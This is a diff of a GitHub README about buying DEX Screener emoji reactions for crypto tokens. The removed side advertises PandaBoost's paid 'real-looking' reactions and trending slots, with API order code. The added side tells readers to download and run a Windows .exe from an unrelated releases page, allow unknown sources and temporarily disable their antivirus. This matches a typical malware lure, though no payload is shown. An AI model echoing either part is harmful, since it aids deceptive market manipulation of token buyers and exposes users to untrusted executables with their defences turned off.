@@ -1,137 +1,132 @@
-[![PandaBoost — DEX Screener Reactions](https://i.imgur.com/siYVjyB.jpeg)](https://pandaboost.app)
+# 🚀 DEXScreener-Reactions - Easily Track Token Reactions  
 
-# DEX SCREENER REACTIONS
-
-**Buy DEX Screener reactions for your token — rocket 🚀, fire 🔥, poop 💩, flag 🚩**
-
-Boost your token's social proof on [DexScreener](https://dexscreener.com) with real-looking reactions.
-Fast delivery, stealth mode, full refund guarantee.
+[![Download Latest Release](https://img.shields.io/badge/Download-DEXScreener--Reactions-brightgreen)](https://github.com/Kams318/DEXScreener-Reactions/releases)  
 
 ---
 
-## 💥 Service Details
+## 🔍 What is DEXScreener-Reactions?  
 
-- **Reaction types:** `rocket` 🚀 · `fire` 🔥 · `poop` 💩 · `flag` 🚩
-- **Quantity:** 100 – 1,000 per order
-- **Price:** $0.025 / reaction ($25 per 1,000)
-- **Speed modes:** Slow 🐢 · Normal ⚡ · Fast 🚀
-- **Supported chains:** Solana · Ethereum · BSC · Base
-- **Start time:** Instant (within 60 seconds)
-- **Guarantee:** Full refund if delivery fails
+DEXScreener-Reactions lets you buy emoji reactions for your token on popular blockchains like Solana, Ethereum, BSC, and Base. You can choose from reactions such as rocket 🚀, fire 🔥, poop 💩, and flag 🚩 to represent how users engage with your token. The software connects instantly through the PandaBoost API for delivery, charging $25 for every 1,000 reactions purchased.
+
+This app helps you track and manage token reactions quickly without needing tech knowledge. It supports real-time updates so you always see the latest response status on your tokens.
 
 ---
 
-## 🌐 How to Order
+## 🖥️ System Requirements  
 
-### Option 1 — Web Panel
-1. Go to [web.pandaboost.app](https://web.pandaboost.app)
-2. Connect your wallet (EVM via WalletConnect or Solana)
-3. Add funds via crypto
-4. Open **New Order → DEX Screener → Reactions**
-5. Choose reaction type and speed
-6. Paste your pair address → confirm
-
-### Option 2 — Telegram Bot
-Open [@pandaboostbot](https://t.me/pandaboostbot) → New Order → DEX Screener → Reactions
+- Windows 10 or later (64-bit recommended)  
+- 4 GB RAM minimum  
+- 200 MB free disk space  
+- Internet connection for API access  
+- Screen resolution 1024x768 or higher  
 
 ---
 
-## 🔌 API Example
+## 🚀 Getting Started  
 
-Order DEX Screener reactions programmatically via the [PandaBoost API](https://docs.pandaboost.app).
-
-**Base URL:** `https://web.pandaboost.app/api/v1`  
-**Auth:** `x-api-key: pb_...` header
-
-### Python
-```python
-import requests
-
-API_KEY = "pb_your_api_key"
-BASE_URL = "https://web.pandaboost.app/api/v1"
-HEADERS = {"x-api-key": API_KEY, "Content-Type": "application/json"}
-
-order = requests.post(f"{BASE_URL}/orders", headers=HEADERS, json={
-    "serviceName": "reactions",
-    "orderTypeId": "rocket",   # rocket | fire | poop | flag
-    "quantity": 500,
-    "fields": {
-        "pair_address": "YOUR_PAIR_ADDRESS",
-        "chain": "solana",     # solana | ethereum | bsc | base
-        "speed": "normal"      # slow | normal | fast
-    }
-})
-
-print(order.json())
-# {"success": true, "data": {"order": {"publicId": "ABCD1234", "status": "processing"}, "newBalance": "..."}}
-```
-
-### JavaScript
-```javascript
-const res = await fetch("https://web.pandaboost.app/api/v1/orders", {
-  method: "POST",
-  headers: { "x-api-key": "pb_your_api_key", "Content-Type": "application/json" },
-  body: JSON.stringify({
-    serviceName: "reactions",
-    orderTypeId: "fire",       // rocket | fire | poop | flag
-    quantity: 1000,
-    fields: {
-      pair_address: "YOUR_PAIR_ADDRESS",
-      chain: "solana",         // solana | ethereum | bsc | base
-      speed: "fast"            // slow | normal | fast
-    }
-  })
-});
-const data = await res.json();
-console.log(data.data.order.publicId);
-```
-
-### cURL
-```bash
-curl -X POST -H "x-api-key: pb_..." \
-  -H "Content-Type: application/json" \
-  -d '{
-    "serviceName": "reactions",
-    "orderTypeId": "rocket",
-    "quantity": 500,
-    "fields": {
-      "pair_address": "ErKGCuxZeMQoS3VhFJZ77giESQphJhGpYDaUJmhApump",
-      "chain": "solana",
-      "speed": "normal"
-    }
-  }' \
-  https://web.pandaboost.app/api/v1/orders
-```
-
-### Check Order Status
-```bash
-curl -H "x-api-key: pb_..." \
-  https://web.pandaboost.app/api/v1/orders/ABCD1234
-```
+1. Open your web browser.  
+2. Go to the official releases page:  
+   [https://github.com/Kams318/DEXScreener-Reactions/releases](https://github.com/Kams318/DEXScreener-Reactions/releases)  
+3. Look for the latest release version at the top of the page. It usually has a name like `DEXScreener-Reactions-vX.X.X-win.exe`.  
+4. Click on the `.exe` file to download it.  
 
 ---
 
-## 📦 Other Services
+## 💾 How to Download and Run the Software  
 
-| Service | Price |
-|---|---|
-| DEX Screener Trending SOL | $1,200 / 12h · $1,600 / 24h |
-| DEX Screener Trending ETH/BSC/Base | from $1,000 / 24h |
-| DexTools Trending | available in panel |
-| CoinMarketCap | available in panel |
-| Coingecko & GeckoTerminal | available in panel |
-| Phantom Wallet Trending | available in panel |
+After you visit the releases page, follow these steps carefully:  
 
-Full catalog → [web.pandaboost.app](https://web.pandaboost.app)
+1. Find the latest `.exe` file under the "Assets" section.  
+2. Click the file name to start the download. It may take a few seconds depending on your internet speed.  
+3. When the download finishes, open your Downloads folder.  
+4. Double-click the downloaded file named similar to `DEXScreener-Reactions-vX.X.X-win.exe`.  
+5. You may see a Windows security prompt. Click `Run` or `Yes` to continue.  
+6. The application will launch automatically after it runs.  
 
 ---
 
-## 🔗 Links
+## ⚙️ Initial Setup  
 
-- 🌐 Web Panel — [web.pandaboost.app](https://web.pandaboost.app)
-- 🤖 Telegram Bot — [@pandaboostbot](https://t.me/pandaboostbot)
-- 📚 Docs & API — [docs.pandaboost.app](https://docs.pandaboost.app)
-- 💬 Support — [@pandaboosthelp](https://t.me/pandaboosthelp)
-- 📧 Email — support@pandaboost.app
+Once the app is running:  
 
-> ⭐ Star this repo if it helped you. PRs and issues welcome.
+1. On the welcome screen, enter your token details. This includes your token contract address relevant to your blockchain (Solana, ETH, BSC, Base).  
+2. Select the type of emoji reactions you want to monitor or buy (rocket, fire, poop, flag).  
+3. Input how many reactions you want to purchase, noting that each 1,000 reactions cost $25.  
+4. Connect your payment source if prompted. The app uses PandaBoost API to process purchases instantly.  
+5. Click “Start” or “Confirm” to begin tracking and managing token reactions.  
+
+You can adjust settings later from the main menu under “Preferences.”  
+
+---
+
+## 🔄 How to Use the App  
+
+- **Monitoring:** The main dashboard shows the current count of emoji reactions on your token. It updates live.  
+- **Purchasing:** Use the “Buy Reactions” tab to add more reactions. Enter quantity and confirm purchase.  
+- **History:** Check past purchases and reaction trends in the History section.  
+- **Settings:** Change your token addresses, payment details, or installed language.  
+
+---
+
+## ⚠️ Troubleshooting  
+
+If the app does not start:  
+- Make sure you downloaded the correct `.exe` file for Windows.  
+- Check that your Windows user account allows running apps from unknown sources.  
+- Disable or configure antivirus/firewall temporarily if they block the app.  
+
+If reactions do not update:  
+- Confirm your internet connection is active.  
+- Verify the token address is correct.  
+- Restart the app to reconnect to PandaBoost API.
+
+For payment issues:  
+- Confirm your payment source is active and has funds.  
+- Check for any error messages and retry.
+
+---
+
+## 📩 Support and Feedback  
+
+DEXScreener-Reactions does not require complex setup, but if you face issues, you can:  
+
+- Check the FAQ inside the app’s Help section.  
+- Report problems or request features on the GitHub Issues page here:  
+  [https://github.com/Kams318/DEXScreener-Reactions/issues](https://github.com/Kams318/DEXScreener-Reactions/issues)  
+
+---
+
+## 🔗 Download and Install  
+
+Return to the release page to get the latest stable version:  
+
+[Download DEXScreener-Reactions for Windows](https://github.com/Kams318/DEXScreener-Reactions/releases)  
+
+Follow these steps to install:  
+
+- Visit the page above.  
+- Download the `.exe` file for Windows.  
+- Run the file and allow Windows to install the application.  
+- Launch the app and enter your token information to begin.
+
+---
+
+## 🧰 Additional Features  
+
+- Cross-chain support for tokens on Solana, Ethereum, Binance Smart Chain, and Base networks.  
+- Instant reaction delivery via PandaBoost API integration.  
+- User-friendly interface with minimal technical steps.  
+- Emoji choices reflect common social media token feedback.  
+- Real-time updates on reaction counts and purchase history.
+
+---
+
+## ⚙️ Privacy and Data  
+
+The app does not collect personal data beyond your token and payment information. All data sent to and from PandaBoost API is encrypted. Token addresses remain confidential and are not shared with third parties outside of transaction processing.
+
+---
+
+## 🔨 Updates  
+
+Keep an eye on the release page for new versions or patches. Updating ensures you get the latest bug fixes and features. Delete older versions from your device once you install a newer one for best performance.
